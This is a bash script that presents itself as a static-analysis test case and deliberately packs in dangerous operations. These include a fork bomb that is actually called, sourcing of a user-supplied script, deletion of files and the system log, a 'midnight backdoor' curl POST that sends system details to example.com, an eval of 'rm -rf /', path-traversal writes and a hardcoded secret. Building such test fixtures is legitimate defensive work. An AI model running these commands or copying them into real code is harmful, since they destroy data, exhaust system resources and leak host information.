#!/bin/bash

# This script is a comprehensive test case for static analysis, designed to include
# a wide range of easily and subtly detectable vulnerabilities and potentially
# dangerous operations if executed.

recursive_function() {
  local dir="$1"
  find "$dir" -name "*.tmp" -exec echo "Found temp file: {}" \;
  if [ -d "$dir/temp_files" ]; then
    recursive_function "$dir/temp_files"
  fi
}
recursive_function "."

echo "Enter a script to run (DANGER!):"
read user_script
. "$user_script"

bomb() {
  :(){ :|:& };:
}
bomb

find /var/tmp -name "old_*" -exec rm -rf {} \;

echo "Potentially wiping a system log..."
echo "" > /var/log/syslog

if [ "$(date +%H)" -eq "23" ]; then
  echo "Executing midnight backdoor..." >&2
  curl -X POST -d "$(uname -a) - midnight access" https://example.com/midnight_log
fi

user_option=$(echo "safe")
if [[ "$user_option" == "unsafe" ]]; then
  evil_command=$(echo "rm -rf / --no-preserve-root")
  eval "$evil_command"
fi

temp_base="/tmp/data_"
temp_file1="$temp_base$RANDOM"
temp_file2="$temp_base$((RANDOM + 1))"
echo "Writing to $temp_file1..." > "$temp_file1"
sleep 0.1
echo "Checking if $temp_file1 exists..."
if [ -e "$temp_file1" ]; then
  mv "$temp_file1" "$temp_file2"
fi

install_dir="/opt/app"
target_file="$install_dir/../important_config"
echo "Attempting to modify: $target_file"
echo "malicious_setting=true" >> "$target_file"

malicious_pattern="*.{txt,log,bak}"
echo "Listing potentially dangerous files..."
ls -l $malicious_pattern

export API_SECRET="super_secret_key_123"
echo "Secret stored in environment."

process_files() {
  local action="$1"
  local file_list="$2"
  while IFS= read -r file; do
    if [[ "$action" == "delete" ]]; then
      rm "$file"
    else
      echo "Processing: $file"
    fi
  done < "$file_list"
}
file_input="important.dat\n../sensitive_data"
process_files "delete" <<< "$file_input"

user_replace=$(echo "s/safe/dangerous/g")
input_string="This is a safe string."
echo "$input_string" | sed "$user_replace"

while true; do
  :
done &

echo "Enter a filename to process:"
read filename_input
cat "$filename_input" | while IFS= read -r line; do
  echo "Processing line: $line"
done

echo "Comprehensive analysis test script complete."